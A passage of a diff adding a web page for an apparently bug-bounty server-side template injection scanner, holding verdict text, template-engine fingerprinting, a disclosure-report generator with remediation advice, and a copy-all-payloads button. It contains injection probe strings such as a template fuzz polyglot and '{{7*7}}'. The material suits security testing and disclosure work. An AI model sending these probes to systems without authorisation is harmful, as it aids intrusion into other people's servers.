+      text = `VERDICT: VULNERABLE ⚠\nSEVERITY: HIGH — Potential RCE\nEngine Detected: ${engine}\n\nFINDINGS:\n${findings.join('\n')}\n\nIMPACT:\n• Server is evaluating user input as template code\n• Attacker can potentially read server environment\n• May escalate to Remote Code Execution\n• Sensitive data exposure possible\n\nBUG BOUNTY VALUE: HIGH ($500 - $10,000+)\n\nNEXT STEPS:\n• Document with screenshots\n• Do NOT attempt RCE on production\n• Generate bounty report below`;
+    } else if (isWarn) {
+      text = `VERDICT: INVESTIGATE FURTHER ⚠\nSEVERITY: MEDIUM\nEngine Hint: ${engine}\n\nFINDINGS:\n${findings.join('\n')}\n\nNEXT STEPS:\n• Try more payload variations\n• Test different injection points\n• Check the Payloads tab for alternatives\n• ${recommendations.join('\n• ')}`;
+    } else {
+      text = `VERDICT: NOT VULNERABLE (based on this response)\n\nNo SSTI indicators detected in this response.\n\nThis does NOT mean the endpoint is safe:\n• Try ALL payloads from the Payloads tab\n• Test different parameters\n• Try fuzzing with: ${"${{<%[%'\"}}%\\"}\n• Check different contexts (POST body, headers, cookies)`;
+    }
+
+    return { text, type: isVuln ? 'vuln' : isWarn ? 'warn' : 'safe', isVuln, isWarn, engine };
+  }
+
+  function identifyEngine() {
+    const responses = document.getElementById('fp-responses').value;
+    const output = document.getElementById('engine-output');
+
+    if (!responses) return;
+
+    // Reset engine displays
+    ['jinja2','twig','erb','freemarker','smarty','velocity'].forEach(e => {
+      document.getElementById('eng-' + e).className = 'engine-item';
+      document.getElementById('eng-' + e + '-status').className = 'engine-status status-unknown';
+      document.getElementById('eng-' + e + '-status').textContent = 'UNKNOWN';
+    });
+
+    let detected = [];
+
+    if (responses.includes('7777777')) {
+      setEngine('jinja2', 'detected', 'DETECTED');
+      detected.push('Jinja2 (Python)');
+    }
+    if (responses.includes('49') && responses.includes('{{')) {
+      if (!responses.includes('7777777')) { setEngine('twig', 'detected', 'LIKELY'); detected.push('Twig (PHP)'); }
+      else { setEngine('twig', 'possible', 'POSSIBLE'); }
+    }
+    if (responses.includes('49') && responses.includes('<%=')) {
+      setEngine('erb', 'detected', 'DETECTED');
+      detected.push('ERB (Ruby)');
+    }
+    if (responses.includes('49') && responses.includes('${')) {
+      setEngine('freemarker', 'detected', 'DETECTED');
+      detected.push('FreeMarker (Java)');
+    }
+    if (responses.toLowerCase().includes('smarty')) {
+      setEngine('smarty', 'detected', 'DETECTED');
+      detected.push('Smarty (PHP)');
+    }
+    if (responses.toLowerCase().includes('velocity')) {
+      setEngine('velocity', 'detected', 'DETECTED');
+      detected.push('Velocity (Java)');
+    }
+
+    output.textContent = detected.length
+      ? `Engine(s) Identified: ${detected.join(', ')}\n\nCheck the Payloads tab for engine-specific exploitation vectors.`
+      : 'Could not definitively identify engine from these responses.\nTry more payloads from the Payloads tab.';
+    output.className = 'output show ' + (detected.length ? 'vuln' : 'warn');
+  }
+
+  function setEngine(engine, status, text) {
+    document.getElementById('eng-' + engine).className = 'engine-item ' + (status === 'detected' ? 'detected' : status === 'possible' ? 'possible' : '');
+    const statusEl = document.getElementById('eng-' + engine + '-status');
+    statusEl.className = 'engine-status status-' + (status === 'detected' ? 'detected' : status === 'possible' ? 'possible' : 'unknown');
+    statusEl.textContent = text;
+  }
+
+  function generateReport() {
+    const r = window.lastResult;
+    if (!r) return;
+    const now = new Date().toISOString();
+
+    const report = `========================================
+   SERVER SIDE TEMPLATE INJECTION
+   BUG BOUNTY REPORT
+========================================
+Date: ${now}
+Tool: SSTI Scanner v1.0
+Target: ${r.target || 'Not specified'}
+Parameter: ${r.param || 'Not specified'}
+Context: ${r.context || 'Web application'}
+
+VULNERABILITY: Server Side Template Injection (SSTI)
+SEVERITY: HIGH — Potential Remote Code Execution
+CWE: CWE-1336 (Improper Neutralization of Special Elements in Template Engine)
+CVSS: 8.0-9.8 (depending on RCE confirmation)
+
+EXECUTIVE SUMMARY
+-----------------
+A Server Side Template Injection vulnerability was
+identified in the target application. User-supplied
+input is directly embedded into a server-side template
+without proper sanitization, allowing template
+expressions to be evaluated server-side.
+
+PROOF OF CONCEPT
+-----------------
+Payload Used: ${r.payload || 'See findings'}
+Server Response: ${r.response?.slice(0, 200) || 'See attached'}
+
+Template Engine: ${r.engine || 'Unknown'}
+
+FINDINGS:
+${r.text}
+
+IMPACT
+------
+• Information disclosure — server environment, config
+• Potential for Remote Code Execution (RCE)
+• Complete server compromise in worst case
+• Data exfiltration of sensitive application data
+
+STEPS TO REPRODUCE
+------------------
+1. Navigate to: ${r.target || '[TARGET URL]'}
+2. Locate the vulnerable parameter: ${r.param || '[PARAMETER]'}
+3. Insert payload: ${r.payload || '{{7*7}}'}
+4. Observe server evaluates expression in response
+5. Server returns evaluated result instead of literal string
+
+REMEDIATION
+-----------
+• Never concatenate user input directly into templates
+• Use template engines in sandboxed mode
+• Implement strict input validation and allowlisting
+• Pass user data as template variables, not template code
+• Use a Web Application Firewall to detect payloads
+• Apply least-privilege principle to template engine
+
+REFERENCES
+----------
+• OWASP: Server Side Template Injection
+• PortSwigger Web Security Academy: SSTI
+• PayloadsAllTheThings: SSTI
+• CWE-1336
+
+========================================
+FOR RESPONSIBLE DISCLOSURE ONLY
+AIVT // SSTI SCANNER // RESEARCH TOOL
+========================================`.trim();
+
+    const box = document.getElementById('report-box');
+    box.textContent = report;
+    box.classList.add('show');
+    document.getElementById('copy-btn').style.display = 'block';
+  }
+
+  function copyReport() {
+    const text = document.getElementById('report-box').textContent;
+    navigator.clipboard.writeText(text).then(() => {
+      const btn = document.getElementById('copy-btn');
+      btn.textContent = 'COPIED!';
+      setTimeout(() => btn.textContent = 'COPY REPORT', 1500);
+    });
+  }
+
+  function copyAllPayloads() {
+    const text = payloads.map(p => p.code).join('\n');
+    navigator.clipboard.writeText(text).then(() => {
+      const btn = event.target;
+      btn.textContent = 'COPIED ALL PAYLOADS!';
+      setTimeout(() => btn.textContent = 'COPY ALL PAYLOADS', 1500);
+    });
+  }
+
+  // Init
+  renderPayloads();
+</script>
+</body>
+</html>
